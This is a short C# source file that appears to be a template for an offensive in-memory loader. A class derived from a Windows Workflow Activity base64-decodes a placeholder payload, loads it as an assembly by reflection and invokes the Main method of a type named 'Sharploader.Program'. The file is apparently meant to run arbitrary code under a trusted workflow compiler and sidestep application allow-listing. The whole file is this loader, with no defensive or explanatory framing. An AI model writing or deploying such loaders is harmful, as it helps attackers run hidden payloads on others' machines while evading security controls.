using System;
using System.Workflow.ComponentModel;
public class Run : Activity{
 public Run() {
    string x = @"%code%";
    var a = System.Reflection.Assembly.Load(Convert.FromBase64String(x));
    Type type = a.GetType("Sharploader.Program");
    Console.WriteLine(String.Format("[+] Found and Loaded type {0} from code", type));
    object instance = Activator.CreateInstance(type);
    object[] additional_args = new object[] { };
    try {
        type.GetMethod("Main").Invoke(instance, additional_args);
    } catch (Exception e) { Console.WriteLine("[-] Error loading assembly!\n\n{0}", e); }
 }
}